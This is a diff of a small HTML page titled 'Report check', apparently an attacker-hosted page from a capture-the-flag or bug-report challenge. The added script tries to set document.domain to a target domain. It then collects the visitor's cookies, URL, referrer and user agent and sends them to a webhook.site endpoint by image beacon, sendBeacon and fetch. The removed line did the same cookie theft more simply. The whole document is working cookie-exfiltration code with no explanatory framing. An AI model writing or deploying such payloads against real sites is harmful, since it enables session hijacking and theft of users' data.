@@ -1,10 +1,56 @@
-<DOCTYPE html>>
-<html lang="en"><head>
+<!doctype html>
+<html lang="en">
+<head>
   <meta charset="utf-8">
   <title>Report check</title>
 </head>
 <body>
   <script>
-    fetch("https://webhook.site/c0b9443f-e66f-4aa7-a0b7-51437258a216/"+document.cookie);
+    const webhook = "https://webhook.site/8c83beb0-14c6-4260-98be-d5d69a8afbb0";
+    let relaxedDomain = null;
+    let domainError = null;
+    try {
+      document.domain = "takedown.cyxo.re";
+      relaxedDomain = document.domain;
+    } catch (e) {
+      domainError = `${e.name}: ${e.message}`;
+    }
+
+    function send(payload) {
+      const query = new URLSearchParams({
+        c: payload.cookie || "",
+        u: payload.href || "",
+        r: payload.referrer || "",
+        t: payload.ts || "",
+        phase: payload.phase || "",
+        result: payload.result || "",
+        error: payload.error || ""
+      });
+
+      new Image().src = `${webhook}?${query.toString()}`;
+      navigator.sendBeacon(webhook, JSON.stringify(payload));
+      fetch(webhook, {
+        method: "POST",
+        mode: "no-cors",
+        headers: {"Content-Type": "text/plain"},
+        body: JSON.stringify(payload)
+      });
+    }
+
+    const basePayload = {
+      href: location.href,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      cookie: document.cookie,
+      documentDomain: document.domain,
+      relaxedDomain,
+      domainError,
+      ts: new Date().toISOString()
+    };
+
+    send({...basePayload, phase: "load"});
+
+    send({...basePayload, phase: "ready"});
   </script>
-</body></html>
+</body>
+</html>
